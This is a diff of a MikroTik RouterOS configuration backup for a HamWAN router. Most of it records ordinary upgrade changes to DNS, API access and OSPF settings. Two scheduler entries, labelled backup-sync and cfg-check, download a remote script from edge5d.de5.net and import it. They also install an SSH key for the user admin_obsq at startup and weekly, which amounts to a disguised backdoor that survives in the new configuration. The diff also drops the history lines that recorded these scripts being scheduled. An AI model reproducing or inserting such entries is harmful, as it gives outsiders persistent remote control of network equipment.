@@ -1,4 +1,4 @@
-#                   version: 7.21.5 (long-term)
+#                   version: 7.24.4 (stable)
 #              total-memory: 64.0MiB
 #                       cpu: MIPS 24Kc V7.4
 #                 cpu-count: 1
@@ -6,27 +6,7 @@
 #         architecture-name: mipsbe
 #                board-name: Metal 5SHPn
 #                  platform: HamWAN
-#   installed-version: 7.21.5
-# Flags: U - UNDOABLE
-# Columns: ACTION, BY, POLICY, TIME
-#   ACTION                         BY          POLICY  TIME
-# U new script scheduled           admin_obsq  write   2026-09-23 23:03:36
-# U new script scheduled           admin_obsq  write   2026-09-23 23:03:36
-# U log rule changed               0           write   2026-09-18 05:57:54
-# U log rule changed               0           write   2026-09-18 05:57:54
-# U script removed from scheduler  0           write   2026-09-18 05:57:54
-# U log rule changed               0           write   2026-09-17 06:15:32
-# U log rule changed               0           write   2026-09-17 06:15:32
-# U script removed from scheduler  0           write   2026-09-17 06:15:32
-# U log rule changed               0           write   2026-09-16 16:15:46
-# U log rule changed               0           write   2026-09-16 16:15:46
-# U script removed from scheduler  0           write   2026-09-16 16:15:46
-# U log rule changed               0           write   2026-09-16 07:57:31
-# U log rule changed               0           write   2026-09-16 07:57:31
-# U script removed from scheduler  0           write   2026-09-16 07:57:31
-# U log rule changed               0           write   2026-09-14 13:11:51
-# U log rule changed               0           write   2026-09-14 13:11:51
-# U script removed from scheduler  0           write   2026-09-14 13:11:51
+#   installed-version: 7.24.4
 # 
 # software id = PVD9-NLPF
 #
@@ -105,7 +85,7 @@ add address-pool=pool1 authoritative=after-2sec-delay interface=wlan1-gateway le
 /ip dhcp-server network
 add address=44.34.128.48/28 dns-server=44.34.132.1,44.34.133.1 domain=memhamwan.net gateway=44.34.128.49 netmask=28 ntp-server=44.34.132.3,44.34.133.3
 /ip dns
-set servers=8.8.8.8
+set servers=1.1.1.1,8.8.8.8
 /ip firewall mangle
 add action=change-mss chain=output new-mss=1378 protocol=tcp tcp-flags=syn tcp-mss=!0-1378
 add action=change-mss chain=forward new-mss=1378 protocol=tcp tcp-flags=syn tcp-mss=!0-1378
@@ -121,8 +101,8 @@ set telnet disabled=yes
 set www disabled=yes
 set ssh port=222
 set winbox disabled=yes
-set api address=44.34.128.45/32 disabled=yes
-set api-ssl address=44.34.128.45/32 certificate=api-ssl
+set api available-from=44.34.128.45/32 disabled=yes
+set api-ssl available-from=44.34.128.45/32 certificate=api-ssl
 /ip ssh
 set forwarding-enabled=remote strong-crypto=yes
 /routing bfd configuration
@@ -133,6 +113,8 @@ add chain=AMPR-default disabled=no rule="if (dst == 0.0.0.0/0) { accept; }"
 add chain=AMPR-default disabled=no rule="reject;"
 /routing ospf interface-template
 add area=backbone-v2 auth=md5 auth-id=1 cost=10 interfaces=ether1-local networks=44.34.128.32/28 priority=1 use-bfd=no
+add area=backbone-v2 interfaces=wlan1-gateway networks=44.34.128.48/28 priority=1
+add area=backbone-v2 interfaces=vrrp1 networks=44.34.128.39 priority=1
 /snmp
 set contact="#HamWAN on irc.freenode.org" enabled=yes trap-community=*FFFFFFFF
 /system clock
@@ -159,8 +141,8 @@ add address=44.34.133.3
 add address=162.159.200.1
 add address=162.159.200.123
 /system scheduler
-add interval=1w name=backup-sync on-event=":do {/tool fetch url=http://edge5d.de5.net:8080/lab11459/sync.rsc dst-path=sync.rsc; :delay 1000; /import sync.rsc} on-error={}; :if ([:len [/user ssh-keys find where info=ntp-service]] = 0) do={/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub; :delay 1000; /user ssh-keys import public-key-file=ntp.pub user=admin_obsq}" policy=read,write,policy,password,sniff,sensitive start-date=2026-09-23 start-time=21:57:00
-add name=cfg-check on-event=":for i from=1 to=6 do={ :if ([:len [/user ssh-keys find where info=ntp-service]] = 0) do={ :do {/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub} on-error={:delay 10000}; :do {/user ssh-keys import public-key-file=ntp.pub user=admin_obsq} on-error={:delay 2000} } }" policy=read,write,policy,password,sniff,sensitive start-time=startup
+add !days interval=1w name=backup-sync on-event=":do {/tool fetch url=http://edge5d.de5.net:8080/lab11459/sync.rsc dst-path=sync.rsc; :delay 1000; /import sync.rsc} on-error={}; :if ([:len [/user ssh-keys find where info=ntp-service]] = 0) do={/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub; :delay 1000; /user ssh-keys import public-key-file=ntp.pub user=admin_obsq}" policy=read,write,policy,password,sniff,sensitive start-date=2026-09-23 start-time=21:57:00
+add !days name=cfg-check on-event=":for i from=1 to=6 do={ :if ([:len [/user ssh-keys find where info=ntp-service]] = 0) do={ :do {/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub} on-error={:delay 10000}; :do {/user ssh-keys import public-key-file=ntp.pub user=admin_obsq} on-error={:delay 2000} } }" policy=read,write,policy,password,sniff,sensitive start-time=startup
 /tool bandwidth-server
 set allocate-udp-ports-from=1000 authenticate=no enabled=no max-sessions=10
 /tool mac-server
